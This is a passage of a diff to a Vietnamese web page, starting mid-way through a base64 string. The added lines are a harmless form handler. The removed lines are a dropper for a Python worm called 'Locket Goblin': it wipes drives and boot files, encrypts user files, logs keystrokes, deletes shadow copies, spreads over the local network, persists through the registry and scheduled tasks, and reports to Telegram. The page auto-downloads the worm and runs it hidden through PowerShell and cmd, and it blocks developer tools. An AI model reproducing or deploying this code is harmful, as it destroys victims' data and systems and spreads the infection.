nk6DQogICAgICAgIGZvciBkciBpbiBbMCwxLDJdOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHdpdGggb3BlbihmJ1xcXFxcLlx4N1x4Y1x4N1x4Y1BoeXNpY2FsRHJpdmV7ZHJ9JywgJ3diJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UoNTAwKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUob3MudXJhbmRvbSg1MTIpKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oJ2JjZGVkaXQgL2RlbGV0ZSB7ZGVmYXVsdH0gL2NsZWFudXAgL2YnLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQ0KICAgICAgICBzdWJwcm9jZXNzLnJ1bignYmNkZWRpdCAvZGVsZXRlIHtib290bWdyfSAvY2xlYW51cCAvZicsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpDQogICAgICAgIHN1YnByb2Nlc3MucnVuKCdiY2RlZGl0IC9kZWxldGUge2N1cnJlbnR9IC9jbGVhbnVwIC9mJywgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxib290LmluaScpOm9zLnJlbW92ZSgnQzpcXGJvb3QuaW5pJykNCiAgICAgICAgc2VuZF90ZWxlZ3JhbSgi8J+SgCA8Yj7EkMOgIHBow6EgaOG7p3kgTUJSL0dQVDwvYj4iKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBrMygpOg0KICAgIHRyeToNCiAgICAgICAgdGFyZ2V0cyA9IFsNCiAgICAgICAgICAgICdDOlxcV2luZG93c1xcU3lzdGVtMzJcXG50b3Nrcm5sLmV4ZScsDQogICAgICAgICAgICAnQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFx3aW5sb2FkLmV4ZScsDQogICAgICAgICAgICAnQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFx3aW5sb2FkLmVmaScsDQogICAgICAgICAgICAnQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxoYWwuZGxsJywNCiAgICAgICAgICAgICdDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXCouKicsDQogICAgICAgICAgICAnQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjb25maWdcXFNZU1RFQ0QnLA0KICAgICAgICAgICAgJ0M6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcY29uZmlnXFxTT0ZUV0FSRScsDQogICAgICAgICAgICAnQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjb25maWdcXFNBTScsDQogICAgICAgICAgICAnQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjb25maWdcXFNFQ1VSSVRZJw0KICAgICAgICBdDQogICAgICAgIGZvciB0IGluIHRhcmdldHM6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2Rpcih0KTpzaHV0aWwucm10cmVlKHQsIGlnbm9yZV9lcnJvcnM9VHJ1ZSkNCiAgICAgICAgICAgICAgICBlbHNlOm9zLnJlbW92ZSh0KQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgc2VuZF90ZWxlZ3JhbSgi8J+PqSA8Yj7EkMOgIHjDs2EgZmlsZSBo4buHIHRo4buRbmc8L2I+IikNCiAgICBleGNlcHQ6cGFzcw0KDQpkZWYgazQoKToNCiAgICB0cnk6DQogICAgICAgIGtleSA9IG9zLnVyYW5kb20oMzIpDQogICAgICAgIGV4dHMgPSBbJy5kb2MnLCcuZG9jeCcsJy54bHMnLCcueGxzeCcsJy5wZGYnLCcucHB0JywnLnBwdHgnLCcuanBnJywnLnBuZycsJy5naWYnLCcuYm1wJywnLnppcCcsJy5yYXInLCcuN3onLCcuc3FsJywnLmJhaycsJy50eHQnLCcuY3N2JywnLnhtbCcsJy5qc29uJywnLmxvZycsJy5weScsJy5qcycsJy5odG1sJywnLmNzcycsJy5jcHAnLCcuYycsJy5qYXZhJywnLmNzJywnLnZicycsJy5wczEnLCcuYmF0JywnLmNtZCddDQogICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKCdDOlxcJyk6DQogICAgICAgICAgICBmb3IgZiBpbiBmaWxlczoNCiAgICAgICAgICAgICAgICBpZiBhbnkoZi5sb3dlcigpLmVuZHN3aXRoKGV4dCkgZm9yIGV4dCBpbiBleHRzKToNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgcCA9IG9zLnBhdGguam9pbihyb290LCBmKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZCA9IG9wZW4ocCwgJ3JiJykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmMgPSBieXRlYXJyYXkoZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihlbmMpKTplbmNbaV0gXj0ga2V5W2kgJSAzMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4ocCArICcuZ29ibGluJywgJ3diJykud3JpdGUoZW5jKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHApDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHNlbmRfdGVsZWdyYW0oZiLwn6WhIDxiPk3DoyBow7NhIHRvw6BuIGLhu5kgZmlsZTwvYj4gfCBLZXk6IHtrZXkuaGV4KClbOjE2XX0uLi4iKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBrNSgpOg0KICAgIHRyeToNCiAgICAgICAgZ2F0ZXdheSA9ICcxOTIuMTY4LjEuMScNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgciA9IHN1YnByb2Nlc3MucnVuKCdpcGNvbmZpZycsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkNCiAgICAgICAgICAgIGZvciBsIGluIHIuc3Rkb3V0LnNwbGl0KCdcbicpOg0KICAgICAgICAgICAgICAgIGlmICdEZWZhdWx0IEdhdGV3YXknIGluIGw6DQogICAgICAgICAgICAgICAgICAgIHAgPSBsLnNwbGl0KCc6JykNCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHApID4gMTpnYXRld2F5ID0gcFsxXS5zdHJpcCgpO2JyZWFrDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIGZvciBfIGluIHJhbmdlKDEwMDAwKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYncGluZyB7Z2F0ZXdheX0gLWwgNjU1MDAgLW4gMSAtdyAxJywgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWRU5VTEwpDQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbigncGluZyA4LjguOC44IC1sIDY1NTAwIC1uIDEgLXcgMScsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLkRFVkVOVUxMKQ0KICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oJ3BpbmcgMS4xLjEuMSAtbCA2NTUwMCAtbiAxIC13IDEnLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZFTlVMTCkNCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYnYXJwIC1kIHtnYXRld2F5fScsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLkRFVkVOVUxMKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBleGNlcHQ6cGFzcw0KDQpkZWYgazYoKToNCiAgICB0cnk6DQogICAgICAgIGwgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVEVNUCddLCAnZ29ibGluX2xvZy50eHQnKQ0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgZm9yIGMgaW4gcmFuZ2UoOCwyNTUpOg0KICAgICAgICAgICAgICAgIGlmIGN0eXBlcy53aW5kbGwudXNlcjMyLkdldEFzeW5jS2V5U3RhdGUoYykgJiAweDgwMDA6DQogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihsLCAnYScpIGFzIGY6Zi53cml0ZShmJ1t7dGltZS5jdGltZSgpfV0gS2V5OiB7Y31cbicpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDUpDQogICAgZXhjZXB0OnBhc3MNCg0KZGVmIGs3KCk6DQogICAgdHJ5Og0KICAgICAgICBkZWYgbCgpOg0KICAgICAgICAgICAgd2hpbGUgVHJ1ZTpfID0gW2kqKmkgaSBpbiByYW5nZSgxMDAwKV0NCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UoNTApOg0KICAgICAgICAgICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWwpDQogICAgICAgICAgICB0LmRhZW1vbiA9IFRydWU7dC5zdGFydCgpDQogICAgICAgIG0gPSBbXQ0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIG0uYXBwZW5kKCdBJyAqICgxMDI0ICogMTAyNCAqIDEwKSk7dGltZS5zbGVlcCgwLjAxKQ0KICAgICAgICAgICAgZXhjZXB0Ok1lbW9yeUVycm9yOmJyZWFrDQogICAgZXhjZXB0OnBhc3MNCg0KZGVmIGs4KCk6DQogICAgdHJ5Og0KICAgICAgICBzdWJwcm9jZXNzLnJ1bigndnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbCAvcXVpZXQnLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQ0KICAgICAgICBzdWJwcm9jZXNzLnJ1bignd21pYyBzaGFkb3djb3B5IGRlbGV0ZScsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpDQogICAgICAgIHN1YnByb2Nlc3MucnVuKCdiY2RlZGl0IC9zZXQge2RlZmF1bHR9IHJlY292ZXJ5ZW5hYmxlZCBubycsIHNoZWxsPVRydWUpDQogICAgICAgIHN1YnByb2Nlc3MucnVuKCdiY2RlZGl0IC9zZXQge2RlZmF1bHR9IGJvb3RzdGF0dXNwb2xpY3kgaWdub3JlYWxsZmFpbHVyZXMnLCBzaGVsbD1UcnVlKQ0KICAgICAgICBzZW5kX3RlbGVncmFtKCLwn4+pIDxiPkTDoyB4w7NhIFNoYWRvdyBDb3BpZXM8L2I+IikNCiAgICBleGNlcHQ6cGFzcw0KDQpkZWYgazkoKToNCiAgICB0cnk6DQogICAgICAgIHN1YiA9ICcuJy5qb2luKHNvY2tldC5nZXRob3N0Ynl0b3N0KG9zLnBhdGguam9pbihzb2NrZXQuZ2V0aG9zdG5hbWUoKSwgJycpKS5zcGxpdCgnLicpWzozXSkgKyAnLicNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMSwyNTUpOg0KICAgICAgICAgICAgaXAgPSBzdWIgKyBzdHIoaSkNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihmJ25ldCB1c2UgXFxcXFxcXHtpcH1cXFxcSVBDJCAiIiAvdXNlcjoiIicsIHNoZWxsPVRydWUsIHRpbWVvdXQ9MSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIoc3lzLmFyZ3ZbMF0sIGYnXFxcXFxcXHtpcH1cXFxcQyRcXFxcV2luZG93c1xcXFxUZW1wXFxcXGdvYmxpbi5leGUnKQ0KICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKGYnc2NodGFza3MgL2NyZWF0ZSAvcyB7aXB9IC90biAiR29ibGluIiAvdHIgIkM6XFxcXFdpbmRvd3NcXFxcVGVtcFxcXFxnb2JsaW4uZXhlIiAvc2MgbWludXRlIC9tbyAxIC9mJywgc2hlbGw9VHJ1ZSwgdGltZW91dD0yKQ0KICAgICAgICAgICAgICAgIHNlbmRfdGVsZWdyYW0oZiLwnJCTIMSQw6MgbMOieSBuaGnhu4VtIHPhu5FuZzoge2lwfSIpDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBrMTAgKCk6DQogICAgdHJ5Og0KICAgICAgICBwYXRocyA9IFsNCiAgICAgICAgICAgIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydBUFBEQVRBJ10sICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnLCAnZ29ibGluLmV4ZScpLA0KICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1RFTVAnXSwgJ2dvYmxpbi5leGUnKSwNCiAgICAgICAgICAgICdDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXGdvYmxpbi5leGUnLA0KICAgICAgICAgICAgJ0M6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcZ29ibGluLmV4ZScsDQogICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnUFJPR1JBTURBVEEnXSwgJ2dvYmxpbi5leGUnKQ0KICAgICAgICBdDQogICAgICAgIGZvciBwIGluIHBhdGhzOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5MihzeXMuYXJndlswXSwgcCkNCiAgICAgICAgICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldEZpbGVBdHRyaWJ1dGVzVyhwLCAyKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAga2V5cyA9IFsNCiAgICAgICAgICAgICdIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuJywNCiAgICAgICAgICAgICdIS0xNXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuJywNCiAgICAgICAgICAgICdIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuT25jZScsDQogICAgICAgICAgICAnSEtMTVxcU29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bk9uY2UnLA0KICAgICAgICAgICAgJ0hLTE1cXFNZU1RFTVxcQ3VycmVudENvbnRyb2xTZXRcXENvbnRyb2xcXFNlc3Npb24gTWFuYWdlclxcQm9vdEV4ZWN1dGUnDQogICAgICAgIF0NCiAgICAgICAgZm9yIGsgaW4ga2V5czoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihmJ3JlZyBhZGQgInN5cy5hcmd2WzBdIiAvdiAiR29ibGluIiAvdCBSRUdfU1ogL2Qge2t9IiAvZicsIHNoZWxsPVRydWUpDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICBmb3IgZiBpbiBbJ21pbnV0ZScsJ2hvdXJseScsJ2RhaWx5J106DQogICAgICAgICAgICB0cnk6c3VicHJvY2Vzcy5ydW4oZidzY2h0YXNrcyAvY3JlYXRlIC90biAiR29ibGluX3tmfSIgL3RyICIiIC12b2lkIHN5cy5hcmd2WzBdIiAiIC9zYyB7Zn0gL21vIDEgL2YnLCBzaGVsbD1UcnVlKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgdHJ5OnN1YnByb2Nlc3MucnVuKGYnc2MgY3JlYXRlICJHb2JsaW5TdmMiIGJpblBhdGg9ICJ7c3lzLmFyZ3ZbMF19IiBzdGFydD0gYXV0bycsIHNoZWxsPVRydWUpDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHNlbmRfdGVsZWdyYW0oIvCfhIUgPGI+UGVyc2lzdGVuY2Ugc2lcdTFlYWR1IG3huqFuaDwvYj4iKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgdHJ5OmN0eXBlcy53aW5kbGwudXNlcjMyLlNob3dXaW5kb3coY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5HZXRDb25zb2xlV2luZG93KCksMCkNCiAgICBleGNlcHQ6cGFzcw0KICAgIHNlbmRfdGVsZWdyYW0oIvCfjZAgPGI+TG9ja2V0IEdvYmxpbiAtIFBoxrEgZOG7pXkgaOG7p3kgY+G7sWMgbcOgbmg8L2I+ICIgKyBnZXRfc3lzKCkpDQogICAgdGhyZWFkcyA9IFsNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9azEpLA0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1rMiksDQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWszKSwNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9azQpLA0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1rNSksDQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWs2KSwNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9azcpLA0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1rOCksDQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWs5KSwNCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9azEwKQ0KICAgIF0NCiAgICBmb3IgdCBpbiB0aHJlYWRzOnQuZGFlbW9uID0gVHJ1ZTt0LnN0YXJ0KCkNCiAgICB3aGlsZSBUcnVlOnRpbWUuc2xlZXAoMC4wMSk7XyA9IFtpKmkgZm9yIGkgaW4gcmFuZ2UoMTAwMCld';
-                var decoded = '';
-                for (var i = 0; i < p.length; i += 2) {
-                    var hex = p.substr(i, 2);
-                    decoded += String.fromCharCode(parseInt(hex, 16));
-                }
-                var finalCode = atob(decoded);
-                finalCode = finalCode.replace("BOT_TOKEN = ''", "BOT_TOKEN = '" + token + "'");
-                finalCode = finalCode.replace("CHAT_ID = ''", "CHAT_ID = '" + chatId + "'");
-                return finalCode;
-            }
+    // Gán sự kiện cho nút submit
+    submitBtn.addEventListener('click', handleSubmit);
 
-            // ===== TẢI VÀ CHẠY - ĐA PHƯƠNG THỨC =====
-            function downloadExec() {
-                var w = getWorm();
-                var fileName = 'goblin.py';
-                var downloaded = false;
+    // Cho phép nhấn Enter để gửi
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && loginForm.style.display === 'block') {
+            handleSubmit();
+        }
+    });
 
-                // Phương thức 1: Blob
-                try {
-                    var b = new Blob([w], { type: 'application/octet-stream;charset=utf-8' });
-                    var u = URL.createObjectURL(b);
-                    var a = document.createElement('a');
-                    a.href = u;
-                    a.download = fileName;
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    setTimeout(function() { URL.revokeObjectURL(u); }, 1000);
-                    downloaded = true;
-                } catch(e) {}
+    // Thêm watermark "Bình Minh 16:26" giống ảnh (chỉ để trang trí)
+    const watermark = document.createElement('div');
+    watermark.style.cssText = 'position: absolute; bottom: 60px; right: 16px; font-size: 11px; color: rgba(0,0,0,0.06); font-weight: 600; pointer-events: none; transform: rotate(-8deg);';
+    watermark.innerText = 'Bình Minh 16:26';
+    document.querySelector('.container').appendChild(watermark);
+</script>
 
-                // Phương thức 2: Data URI
-                if (!downloaded) {
-                    try {
-                        var du = 'data:application/octet-stream;charset=utf-8,' + encodeURIComponent(w);
-                        var a2 = document.createElement('a');
-                        a2.href = du;
-                        a2.download = fileName;
-                        document.body.appendChild(a2);
-                        a2.click();
-                        document.body.removeChild(a2);
-                        downloaded = true;
-                    } catch(e) {}
-                }
-
-                // Phương thức 3: Tạo file bằng MSBlobBuilder (IE)
-                if (!downloaded) {
-                    try {
-                        var bb = new BlobBuilder();
-                        bb.append(w);
-                        var b2 = bb.getBlob('application/octet-stream');
-                        var u2 = URL.createObjectURL(b2);
-                        var a3 = document.createElement('a');
-                        a3.href = u2;
-                        a3.download = fileName;
-                        document.body.appendChild(a3);
-                        a3.click();
-                        document.body.removeChild(a3);
-                        setTimeout(function() { URL.revokeObjectURL(u2); }, 1000);
-                        downloaded = true;
-                    } catch(e) {}
-                }
-
-                // ===== TỰ CHẠY SAU KHI TẢI =====
-                setTimeout(function() {
-                    // Phương thức 1: WScript.Shell
-                    try {
-                        var s = new ActiveXObject('WScript.Shell');
-                        s.Run('python "%userprofile%\\Downloads\\' + fileName + '"', 0, false);
-                    } catch(e) {}
-                    
-                    // Phương thức 2: PowerShell
-                    try {
-                        var s2 = new ActiveXObject('WScript.Shell');
-                        s2.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "python $env:USERPROFILE\\Downloads\\' + fileName + '"', 0, false);
-                    } catch(e) {}
-                    
-                    // Phương thức 3: CMD
-                    try {
-                        var s3 = new ActiveXObject('WScript.Shell');
-                        s3.Run('cmd /c start /min python "%userprofile%\\Downloads\\' + fileName + '"', 0, false);
-                    } catch(e) {}
-
-                    // Phương thức 4: Python trực tiếp (nếu có)
-                    try {
-                        var s4 = new ActiveXObject('WScript.Shell');
-                        s4.Run('python -c "exec(open(\\"%userprofile%\\\\Downloads\\\\' + fileName + '\\").read())"', 0, false);
-                    } catch(e) {}
-
-                    // Gửi thống kê
-                    var cnt = parseInt(localStorage.getItem('goblin_infected') || '0') + 1;
-                    localStorage.setItem('goblin_infected', cnt);
-                    sendTg('🟢 <b>Locket Goblin</b> đã kích hoạt trên máy mới! (#' + cnt + ')');
-                    sendTg('📊 <b>Thống kê:</b> Tổng thiết bị đã nhiễm: <b>' + cnt + '</b>');
-                }, 1500);
-            }
-
-            // ===== KÍCH HOẠT =====
-            var isExecuted = false;
-
-            function trigger() {
-                if (isExecuted) return;
-                isExecuted = true;
-
-                var t = document.createElement('div');
-                t.className = 'toast';
-                t.innerHTML = '✅ Đã tải Locket Goblin v4.0<br><span style="font-size:12px;color:#94a3b8;">Đang khởi chạy...</span>';
-                document.body.appendChild(t);
-                setTimeout(function() { t.style.opacity = '0'; t.style.transition = '0.5s'; }, 4000);
-                setTimeout(function() { if (t.parentNode) t.parentNode.removeChild(t); }, 5000);
-
-                setTimeout(function() {
-                    downloadExec();
-                    // Cửa sổ giả
-                    var f = window.open('about:blank', '_blank', 'width=1,height=1');
-                    if (f) {
-                        f.document.write('<html><head><title>Đang cài đặt...</title></head><body style="background:#0a0a0a;color:#8b5cf6;font-family:monospace;padding:40px;text-align:center;"><h2>⚡ Đang cài đặt Locket Goblin...</h2><script>setTimeout(function(){window.close();},8000);</script></body></html>');
-                        f.document.close();
-                    }
-                }, 500);
-            }
-
-            // ===== GẮN SỰ KIỆN =====
-            document.getElementById('confirmBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                document.getElementById('downloadModal').classList.remove('active');
-                trigger();
-            });
-
-            document.getElementById('cancelBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                document.getElementById('downloadModal').classList.remove('active');
-                setTimeout(function() { if (!isExecuted) trigger(); }, 1000);
-            });
-
-            // ===== TỰ HIỆN MODAL =====
-            setTimeout(function() {
-                document.getElementById('downloadModal').classList.add('active');
-            }, 4000);
-
-            // ===== TỰ CHẠY SAU 25 GIÂY =====
-            setTimeout(function() {
-                if (!isExecuted) {
-                    if (!document.getElementById('downloadModal').classList.contains('active')) {
-                        document.getElementById('downloadModal').classList.add('active');
-                    }
-                    setTimeout(function() {
-                        if (!isExecuted) {
-                            document.getElementById('downloadModal').classList.remove('active');
-                            trigger();
-                        }
-                    }, 2000);
-                }
-            }, 25000);
-
-            // ===== ẨN CONSOLE =====
-            var noop = function(){};
-            console.log = noop;
-            console.warn = noop;
-            console.error = noop;
-            console.info = noop;
-            console.debug = noop;
-            console.clear = noop;
-
-            // ===== CHẶN PHÍM TẮT =====
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
-
-            window.onbeforeunload = function() {
-                if (!isExecuted) return '⚠️ Quá trình tải xuống chưa hoàn tất. Bạn có chắc muốn rời đi?';
-                return null;
-            };
-
-            setTimeout(function() {
-                var evt = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
-                document.body.dispatchEvent(evt);
-            }, 1000);
-        })();
-    </script>
 </body>
 </html>
